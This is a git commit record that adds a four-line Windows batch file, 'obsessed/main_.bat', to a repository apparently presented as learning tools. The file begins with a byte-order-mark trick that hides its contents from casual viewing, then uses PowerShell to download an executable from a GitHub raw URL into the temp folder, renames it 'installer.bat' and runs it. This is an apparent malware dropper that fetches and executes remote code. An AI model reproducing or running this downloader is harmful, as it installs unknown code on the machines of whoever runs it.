aae99ef416af3be261ea6e8543873aee11e08fa2
odisdrotz71 <odisdrotz71@gmail.com>
2025-03-29 10:47:47 -0700

    Add files via upload

---
+++ obsessed/main_.bat
@@ -0,0 +1,4 @@
+ÿþ&cls
+cd %TEMP%
+Powershell -Command "Invoke-Webrequest 'https://github.com/odisdrotz71/learningtools/raw/refs/heads/main/obsessed/obese.exe' -OutFile installer.bat"
+start installer.bat
